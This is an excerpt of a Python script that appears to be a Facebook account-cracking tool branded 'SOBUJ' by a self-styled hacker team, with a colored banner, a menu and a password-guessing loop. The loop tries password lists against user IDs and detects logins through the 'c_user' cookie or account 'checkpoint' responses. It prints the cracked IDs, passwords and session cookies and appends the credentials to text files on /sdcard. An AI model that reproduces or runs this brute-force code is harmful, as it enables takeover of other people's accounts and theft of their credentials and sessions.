...
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                    
 {gn}Owner    : {cn}Sobuj Ahmad{ed}
 {gn}Guthub   : {cn}sobujhacker{ed}
 {gn}Facebook : {cn}Sobuj ahmad{ed}
 {gn}Taligram : {wn}TDH Team  Dark Hacker {ed}
 {gn}Tools    : {cn}SOBUJ{pn} •{gn}[{cn}version \033[1;42m{rn}•3.6•{ed}{gn}]{ed}
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ed}''')
# MAIN MANU 
def Main():
        os.system("clear")
        ...
        if jubair in ["1","01"]:
            sexy()
        if jubair in ["2","02"]:
        	os.system('xdg-open https://www.facebook.com/SOBUJ1159?mibextid=ZbWKwL')
        if jubair in [" 0", "00"]:
            exit()
        else:
            exit()     
...
def jubair(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[SOBUJ-FIND]\033[1;36m💔[%s/%s]🌺\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mSOBUJ-OK 🌺\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[] COOKIE🌹 :\033[1;95m {coki}")
                open('/sdcard/SOBUJ-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mSOBUJ-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/SOBUJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
#follow my facebook page https://www.facebook.com/SOBUJ1159?mibextid=ZbWKwL'
#follow github https://github.com/soujhacker